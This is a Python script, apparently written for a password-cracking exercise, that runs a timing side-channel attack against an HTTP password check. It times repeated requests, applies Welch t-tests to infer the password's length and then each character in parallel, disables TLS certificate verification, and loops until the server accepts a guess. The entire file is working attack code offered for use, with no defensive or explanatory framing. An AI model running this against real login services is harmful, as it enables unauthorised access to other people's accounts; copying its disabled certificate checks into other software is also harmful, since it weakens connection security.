from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import timeit
import numpy
import requests
import math

from CorrectException import CorrectException
from Config import Config, TASK_CONFIG


def init_environment() -> None:
    """
    Initilizes the configuration so we can access it everywhere.
    """

    load_dotenv()
    global TASK_CONFIG
    TASK_CONFIG = Config(server_ip=os.getenv("SERVER_IP"),
                         username=os.getenv("USERNAME"),
                         difficulty=os.getenv("DIFFICULTY"),
                         format=os.getenv("FORMAT"),
                         retries=int(os.getenv("RETRIES")),
                         password_chars=os.getenv("PASSWORD_CHARS"),
                         max_password_length=int(os.getenv("MAX_PASSWORD_LENGTH")),
                         session=requests.Session())
    
    TASK_CONFIG.session.verify = False
    TASK_CONFIG.session.headers.update({"Connection": "keep-alive"})

def try_password(password: str) -> None:
    """
    :param password: A password to try.
    Return: None, we only care about the time.
    Throws: CorrectException if correct, we want to stop as soon as we hit the correct password
    """

    url = TASK_CONFIG.format.format(TASK_CONFIG.server_ip, TASK_CONFIG.username, password, TASK_CONFIG.difficulty)
    result = TASK_CONFIG.session.get(url).text
    if "1" == result:
        raise CorrectException(password)

def find_length() -> int:
    """
    Uses a timing attack to find the length of the password using t-tests.
    Returns the most likely length.
    """

    single_char = TASK_CONFIG.password_chars[0]
    samples_by_len: list[list[float]] = []

    password = ""
    for _ in range(TASK_CONFIG.max_password_length):
        password += single_char
        samples = time_candidate(password, TASK_CONFIG.retries)
        samples_by_len.append(samples)

    t_scores = [0.0] * TASK_CONFIG.max_password_length

    for length_1 in range(TASK_CONFIG.max_password_length):
        for length_2 in range(TASK_CONFIG.max_password_length):
            if length_1 == length_2:
                continue
            t_scores[length_1] += welch_ttest(samples_by_len[length_1], samples_by_len[length_2])

    return t_scores.index(max(t_scores)) + 1

def time_candidate(candidate: str, repeats: int) -> list[float]:
    """
    Return a list of timing samples instead of one averaged value.
    """
    samples = []
    for _ in range(repeats):
        start = timeit.default_timer()
        try_password(candidate)
        samples.append(timeit.default_timer() - start)
    return samples

def find_char(char: str, password: str) -> tuple[str, list[float]]:
    samples = time_candidate(password, TASK_CONFIG.retries)
    return char, samples

def welch_ttest(sample_a, sample_b):
    """
    Return t-statistic comparing mean(sample_a) > mean(sample_b)
    (one-sided: does A likely have larger mean?)
    """

    mean_a = sum(sample_a) / len(sample_a)
    mean_b = sum(sample_b) / len(sample_b)

    var_a = numpy.var(sample_a, ddof=1)
    var_b = numpy.var(sample_b, ddof=1)

    t_score = (mean_a - mean_b) / math.sqrt(var_a/len(sample_a) + var_b/len(sample_b))
    return t_score

def find_next_char(start_password, padding) -> str:
    """
    Find next char using Welch t-tests instead of max average.
    """

    samples_by_char: dict[str, list[float]] = {}

    with ThreadPoolExecutor(max_workers=len(TASK_CONFIG.password_chars)) as executor:
        futures = {
            executor.submit(
                find_char,
                char,
                start_password + char + padding
            ): char
            for char in TASK_CONFIG.password_chars
        }

        for future in as_completed(futures):
            char, samples = future.result()
            samples_by_char[char] = samples

    t_scores = {char: 0.0 for char in samples_by_char}

    for char_1 in TASK_CONFIG.password_chars:
        for char_2 in TASK_CONFIG.password_chars:
            if char_1 == char_2:
                continue
            t_scores[char_1] += welch_ttest(samples_by_char[char_1], samples_by_char[char_2])

    return max(t_scores, key=t_scores.get)

def _crack() -> None:
    """
    Cracks the password.

    Throws: The correct password
    """
    length = find_length()
    print(length)
    password = ""
    padding = TASK_CONFIG.password_chars[0] * length
    for _ in range(length):
        password += find_next_char(password,padding[0:length-len(password)-1])
        print(password)

def crack() -> str | None:
    """
    Return: password on success or None otherwise.
    """

    try:
        _crack()
        return None
    except CorrectException as password:
        return password.args[0]


def main() -> None:
    init_environment()

    while True:
        password = crack()
        if None != password:
            print(password)
            return

if "__main__" == __name__:
    print(timeit.timeit(main, number=1))
